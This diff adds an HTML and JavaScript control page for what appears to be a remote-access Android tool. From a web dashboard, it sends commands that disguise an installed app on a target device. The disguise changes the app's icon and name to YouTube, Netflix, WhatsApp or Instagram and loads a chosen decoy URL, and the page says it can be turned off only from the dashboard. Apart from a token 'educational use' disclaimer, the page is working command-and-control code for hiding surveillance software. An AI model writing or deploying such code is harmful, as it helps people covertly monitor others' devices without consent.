@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Fake UI - Remote Access</title>
+    <link rel="stylesheet" href="/css/hacker-theme.css">
+    <link href="https://api.fontshare.com/v2/css?f[]=satoshi@400,500,700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+    <style>
+        :root {
+            --font-display: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            --font-mono: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+
+        body {
+            padding: 0;
+            min-height: 100vh;
+            font-family: var(--font-display) !important;
+        }
+
+        .wrap {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px 24px;
+            animation: fadeInUp 0.4s ease-out;
+        }
+
+        /* ── HEADER ── */
+        .pg-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 22px;
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            margin-bottom: 16px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .pg-header::after {
+            display: none;
+        }
+
+        .pg-header-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .pg-icon {
+            width: 42px;
+            height: 42px;
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.12), rgba(0, 255, 65, 0.04));
+            border: 1px solid rgba(0, 255, 65, 0.25);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent);
+            box-shadow: 0 0 16px rgba(0, 255, 65, 0.08);
+        }
+
+        .pg-title {
+            font-family: var(--font-display);
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #e8e8e8;
+        }
+
+        .pg-title span {
+            color: var(--accent);
+            text-shadow: 0 0 12px rgba(0, 255, 65, 0.3);
+        }
+
+        .pg-sub {
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            letter-spacing: 1px;
+            margin-top: 1px;
+        }
+
+        .hdr-actions {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .hdr-btn {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 7px 14px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 500;
+            text-decoration: none;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .hdr-btn:hover {
+            color: var(--accent);
+            border-color: rgba(0, 255, 65, 0.25);
+            background: rgba(0, 255, 65, 0.04);
+        }
+
+        /* ── PANEL ── */
+        .panel {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 12px;
+        }
+
+        .panel-title {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: var(--font-display);
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: var(--accent);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 14px;
+        }
+
+        /* ── TOGGLE ── */
+        .toggle-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 0;
+        }
+
+        .toggle-label {
+            font-family: var(--font-display);
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        .toggle-sub {
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            color: var(--text-muted);
+            margin-top: 2px;
+        }
+
+        .switch {
+            position: relative;
+            width: 52px;
+            height: 28px;
+            flex-shrink: 0;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            inset: 0;
+            background: #1a2332;
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            cursor: pointer;
+            transition: 0.25s;
+        }
+
+        .slider:before {
+            content: '';
+            position: absolute;
+            width: 22px;
+            height: 22px;
+            left: 3px;
+            top: 2px;
+            background: #555;
+            border-radius: 50%;
+            transition: 0.25s;
+        }
+
+        .switch input:checked+.slider {
+            background: rgba(0, 255, 65, 0.2);
+            border-color: var(--accent);
+        }
+
+        .switch input:checked+.slider:before {
+            transform: translateX(23px);
+            background: var(--accent);
+            box-shadow: 0 0 8px rgba(0, 255, 65, 0.5);
+        }
+
+        /* ── INPUT ── */
+        .text-input {
+            width: 100%;
+            padding: 10px 14px;
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-family: var(--font-display);
+            font-size: 0.8rem;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+            outline: none;
+        }
+
+        .text-input:focus {
+            border-color: rgba(0, 255, 65, 0.3);
+            box-shadow: 0 0 6px rgba(0, 255, 65, 0.1);
+        }
+
+        .text-input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .input-hint {
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            margin-top: 6px;
+        }
+
+        /* ── ICON GRID ── */
+        .icon-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 10px;
+        }
+
+        .icon-card {
+            background: var(--bg-panel);
+            border: 2px solid var(--border);
+            border-radius: 10px;
+            padding: 14px 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .icon-card:hover {
+            border-color: rgba(0, 255, 65, 0.25);
+            background: rgba(0, 255, 65, 0.03);
+        }
+
+        .icon-card.selected {
+            border-color: var(--accent);
+            background: rgba(0, 255, 65, 0.06);
+            box-shadow: 0 0 12px rgba(0, 255, 65, 0.1);
+        }
+
+        .icon-preview {
+            width: 44px;
+            height: 44px;
+            border-radius: 12px;
+            margin: 0 auto 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .icon-name {
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            font-weight: 500;
+            color: var(--text-primary);
+        }
+
+        /* ── APPLY BUTTON ── */
+        .btn-apply {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 14px;
+            background: rgba(0, 255, 65, 0.08);
+            border: 1px solid rgba(0, 255, 65, 0.25);
+            color: var(--accent);
+            font-family: var(--font-display);
+            font-size: 0.8rem;
+            font-weight: 700;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.2s;
+            letter-spacing: 1px;
+            margin-bottom: 12px;
+        }
+
+        .btn-apply:hover {
+            background: rgba(0, 255, 65, 0.15);
+            box-shadow: 0 0 16px rgba(0, 255, 65, 0.12);
+        }
+
+        .btn-apply:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-apply.saving {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+
+        /* ── STATUS ── */
+        .status-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        .status-row:last-child {
+            border-bottom: none;
+        }
+
+        .status-key {
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            font-weight: 500;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .status-val {
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 500;
+            color: var(--text-primary);
+        }
+
+        .status-val.on {
+            color: var(--accent);
+        }
+
+        .status-val.off {
+            color: var(--danger);
+        }
+
+        .secret-hint {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            color: var(--text-muted);
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            text-align: center;
+            margin-top: 12px;
+            opacity: 0.6;
+        }
+
+        /* ── DISCLAIMER ── */
+        .disc {
+            margin-top: 28px;
+            padding: 16px 20px;
+            background: rgba(255, 170, 0, 0.03);
+            border: 1px solid rgba(255, 170, 0, 0.1);
+            border-radius: 10px;
+        }
+
+        .disc h4 {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 600;
+            color: var(--warning);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+
+        .disc p {
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            color: var(--text-muted);
+            line-height: 1.6;
+        }
+
+        /* ── FOOTER ── */
+        .ft {
+            text-align: center;
+            padding: 32px 16px;
+            margin-top: 28px;
+            border-top: 1px solid var(--border);
+        }
+
+        .ft .ft-label {
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+
+        .ft .ft-brand {
+            display: inline-block;
+            font-family: var(--font-display);
+            font-size: 1.3rem;
+            font-weight: 700;
+            letter-spacing: 3px;
+            text-transform: lowercase;
+            text-decoration: none;
+            background: linear-gradient(135deg, var(--accent), #00e5ff, var(--accent));
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: drop-shadow(0 0 8px rgba(0, 255, 65, 0.2));
+            transition: all 0.4s ease;
+        }
+
+        .ft .ft-brand:hover {
+            filter: drop-shadow(0 0 16px rgba(0, 255, 65, 0.4));
+            animation: brandShine 1.5s ease infinite;
+        }
+
+        @keyframes brandShine {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        .ft .ft-copy {
+            font-family: var(--font-display);
+            font-size: 0.55rem;
+            color: var(--text-muted);
+            margin-top: 8px;
+            letter-spacing: 1px;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(16px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .wrap {
+                padding: 10px;
+            }
+
+            .pg-header {
+                padding: 12px 16px;
+                flex-wrap: wrap;
+                gap: 10px;
+            }
+
+            .pg-icon {
+                width: 36px;
+                height: 36px;
+            }
+
+            .pg-title {
+                font-size: 0.9rem;
+            }
+
+            .icon-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+
+        @media (max-width: 600px) {
+            .pg-sub {
+                display: none;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .hdr-btn .lbl {
+                display: none;
+            }
+
+            .icon-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 8px;
+            }
+
+            .panel {
+                padding: 14px;
+            }
+
+            .disc {
+                padding: 12px 14px;
+            }
+
+            .ft {
+                padding: 24px 12px;
+                margin-top: 20px;
+            }
+
+            .ft .ft-brand {
+                font-size: 1rem;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .wrap {
+                padding: 8px;
+            }
+
+            .pg-header {
+                padding: 10px 12px;
+            }
+
+            .pg-icon {
+                width: 30px;
+                height: 30px;
+            }
+
+            .pg-title {
+                font-size: 0.85rem;
+            }
+
+            .disc {
+                padding: 10px 12px;
+                border-radius: 8px;
+            }
+
+            .ft .ft-brand {
+                font-size: 0.85rem;
+                letter-spacing: 2px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="wrap">
+
+        <!-- HEADER -->
+        <div class="pg-header">
+            <div class="pg-header-left">
+                <div class="pg-icon"><i data-lucide="layout-template" style="width:20px;height:20px;"></i></div>
+                <div>
+                    <div class="pg-title"><span>Fake</span> UI</div>
+                    <div class="pg-sub">// app disguise configurator</div>
+                </div>
+            </div>
+            <div class="hdr-actions">
+                <a href="javascript:window.history.back()" class="hdr-btn">
+                    <i data-lucide="arrow-left" style="width:14px;height:14px;"></i>
+                    <span class="lbl">Back</span>
+                </a>
+            </div>
+        </div>
+
+        <!-- TOGGLE -->
+        <div class="panel">
+            <div class="panel-title">
+                <i data-lucide="zap" style="width:14px;height:14px;"></i> Disguise Mode
+            </div>
+            <div class="toggle-row">
+                <div>
+                    <div class="toggle-label">Enable Fake UI</div>
+                    <div class="toggle-sub">Replace app UI with a WebView loading your URL</div>
+                </div>
+                <label class="switch">
+                    <input type="checkbox" id="fake-toggle">
+                    <span class="slider"></span>
+                </label>
+            </div>
+        </div>
+
+        <!-- URL -->
+        <div class="panel">
+            <div class="panel-title">
+                <i data-lucide="globe" style="width:14px;height:14px;"></i> Fake UI URL
+            </div>
+            <input type="text" class="text-input" id="fake-url" placeholder="https://www.example.com"
+                autocomplete="off" />
+            <div class="input-hint">Enter any URL — this page will load when the app is opened</div>
+        </div>
+
+        <!-- ICON PICKER -->
+        <div class="panel">
+            <div class="panel-title">
+                <i data-lucide="palette" style="width:14px;height:14px;"></i> Launcher Disguise
+            </div>
+            <div class="icon-grid" id="icon-grid"></div>
+            <div class="input-hint" style="margin-top:8px">Icon & app name change together (Android limitation)</div>
+        </div>
+
+        <!-- APPLY -->
+        <button class="btn-apply" id="apply-btn" onclick="applySettings()">
+            <i data-lucide="rocket" style="width:16px;height:16px;"></i>
+            Apply Disguise
+        </button>
+
+        <!-- STATUS -->
+        <div class="panel">
+            <div class="panel-title">
+                <i data-lucide="bar-chart-3" style="width:14px;height:14px;"></i> Current Status
+            </div>
+            <div id="status-container">
+                <div class="status-row">
+                    <span class="status-key">Status</span>
+                    <span class="status-val" id="st-enabled">Loading...</span>
+                </div>
+                <div class="status-row">
+                    <span class="status-key">Theme</span>
+                    <span class="status-val" id="st-theme">—</span>
+                </div>
+                <div class="status-row">
+                    <span class="status-key">URL</span>
+                    <span class="status-val" id="st-url">—</span>
+                </div>
+                <div class="status-row">
+                    <span class="status-key">Label</span>
+                    <span class="status-val" id="st-label">—</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="secret-hint">
+            <i data-lucide="lock" style="width:12px;height:12px;"></i>
+            Fake UI can ONLY be disabled from this dashboard
+        </div>
+
+        <!-- DISCLAIMER -->
+        <div class="disc">
+            <h4><i data-lucide="alert-triangle" style="width:13px;height:13px;"></i> Disclaimer</h4>
+            <p>This application is intended for EDUCATIONAL AND PERSONAL USE ONLY. Installing or using this on a device
+                without the owner's explicit consent is illegal and unethical.</p>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="ft">
+        <div class="ft-label">crafted by</div>
+        <a href="https://thiyoplus-f.netlify.app/" target="_blank" class="ft-brand">thiyo-de</a>
+        <div class="ft-copy">&copy; 2025 &middot; all rights reserved</div>
+    </footer>
+
+    <script src="/js/api.js"></script>
+    <script src="/js/call-notification.js"></script>
+    <script>
+        lucide.createIcons();
+
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+        if (!deviceId) window.location.href = 'index.html';
+
+        let selectedTheme = 'youtube';
+
+        const THEMES = [
+            { id: 'youtube', image: '/images/fakeui/youtube.webp', label: 'YouTube', color: '#FF0000' },
+            { id: 'netflix', image: '/images/fakeui/netflix.webp', label: 'Netflix', color: '#000000' },
+            { id: 'whatsapp', image: '/images/fakeui/whatsapp.webp', label: 'WhatsApp', color: '#25D366' },
+            { id: 'instagram', image: '/images/fakeui/instagram.png', label: 'Instagram', color: '#C13584' }
+        ];
+
+        function buildIconGrid() {
+            var grid = document.getElementById('icon-grid');
+            var html = '';
+            THEMES.forEach(function (t) {
+                html += '<div class="icon-card' + (t.id === selectedTheme ? ' selected' : '') +
+                    '" data-theme="' + t.id + '" onclick="selectTheme(\'' + t.id + '\')">' +
+                    '<div class="icon-preview" style="background:transparent; padding:0; overflow:hidden;"><img src="' + t.image + '" style="width:100%; height:100%; border-radius:12px; object-fit:contain;"></div>' +
+                    '<div class="icon-name">' + t.label + '</div>' +
+                    '</div>';
+            });
+            grid.innerHTML = html;
+        }
+
+        function selectTheme(themeId) {
+            selectedTheme = themeId;
+            document.querySelectorAll('.icon-card').forEach(function (c) {
+                c.classList.toggle('selected', c.dataset.theme === themeId);
+            });
+        }
+
+        async function loadStatus() {
+            try {
+                var resp = await api.sendCommand(deviceId, 'fake_ui_get');
+                var data = resp.data || resp;
+                if (data.data) data = data.data;
+
+                document.getElementById('fake-toggle').checked = !!data.enabled;
+                document.getElementById('fake-url').value = data.url || '';
+
+                if (data.theme) {
+                    selectedTheme = data.theme;
+                    document.querySelectorAll('.icon-card').forEach(function (c) {
+                        c.classList.toggle('selected', c.dataset.theme === data.theme);
+                    });
+                }
+
+                var stEnabled = document.getElementById('st-enabled');
+                stEnabled.textContent = data.enabled ? 'ACTIVE' : 'DISABLED';
+                stEnabled.className = 'status-val ' + (data.enabled ? 'on' : 'off');
+                document.getElementById('st-theme').textContent = data.theme || '—';
+                document.getElementById('st-url').textContent = data.url || '—';
+                document.getElementById('st-label').textContent = data.label || '—';
+            } catch (e) {
+                document.getElementById('st-enabled').textContent = 'Error: ' + e.message;
+                document.getElementById('st-enabled').className = 'status-val off';
+            }
+        }
+
+        async function applySettings() {
+            var btn = document.getElementById('apply-btn');
+            var enabled = document.getElementById('fake-toggle').checked;
+            var url = document.getElementById('fake-url').value.trim();
+            var theme = THEMES.find(function (t) { return t.id === selectedTheme; });
+            var label = theme ? theme.label : 'YouTube';
+
+            if (enabled && !url) {
+                api.showToast('Enter a URL for the fake UI', 'error');
+                return;
+            }
+
+            btn.classList.add('saving');
+            btn.innerHTML = '<i data-lucide="loader" style="width:16px;height:16px;"></i> Applying...';
+            lucide.createIcons();
+
+            try {
+                await api.sendCommand(deviceId, 'fake_ui_set', {
+                    enabled: enabled,
+                    url: url,
+                    theme: selectedTheme,
+                    label: label
+                });
+                api.showToast(enabled ? 'Disguise activated! Icon will change shortly.' : 'Disguise disabled.', 'success');
+                await loadStatus();
+            } catch (e) {
+                api.showToast('Failed: ' + e.message, 'error');
+            } finally {
+                btn.classList.remove('saving');
+                btn.innerHTML = '<i data-lucide="rocket" style="width:16px;height:16px;"></i> Apply Disguise';
+                lucide.createIcons();
+            }
+        }
+
+        // WebSocket Live Sync
+        function connectWebSocket() {
+            const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsConn = new WebSocket(proto + '//' + location.host);
+
+            wsConn.onmessage = function (event) {
+                try {
+                    const data = JSON.parse(event.data);
+                    if (data.type === 'active_state_sync' && data.deviceId === deviceId) {
+                        const state = data.state;
+                        // ONLY update if FakeUI info is defined
+                        if (state && typeof state.isFakeUiActive !== 'undefined') {
+                            const enabled = state.isFakeUiActive;
+                            document.getElementById('fake-toggle').checked = enabled;
+                            const stEnabled = document.getElementById('st-enabled');
+                            if (stEnabled) {
+                                stEnabled.textContent = enabled ? 'ACTIVE' : 'DISABLED';
+                                stEnabled.className = 'status-val ' + (enabled ? 'on' : 'off');
+                            }
+                        }
+                    }
+                } catch (e) { /* ignore */ }
+            };
+
+            wsConn.onclose = function () {
+                setTimeout(connectWebSocket, 3000);
+            };
+        }
+        
+        // Init
+        buildIconGrid();
+        loadStatus();
+        connectWebSocket();
+    </script>
+</body>
+
+</html>
